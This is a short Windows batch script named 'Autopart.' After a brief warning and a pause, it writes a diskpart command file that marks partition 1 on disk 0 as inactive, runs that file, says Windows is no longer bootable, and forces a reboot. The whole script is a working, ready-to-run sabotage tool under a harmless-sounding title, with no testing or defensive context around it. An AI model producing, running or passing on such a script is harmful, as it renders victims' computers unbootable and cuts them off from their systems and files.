@echo off
color A
title Autopart.

echo Are you sure you want to do this?
echo Your files can be recovered, but it may take advanced troubleshooting.
echo Please make sure you wanted to do this.
pause
echo Alright.
echo select disk 0 > whammy.txt
echo select partition 1 >> whammy.txt
echo inactive >> whammy.txt
echo exit >> whammy.txt
echo Setting partition to inactive...
diskpart /s whammy.txt
echo Windows is no longer bootable now.
echo Rebooting...
wmic os where primary=1 reboot
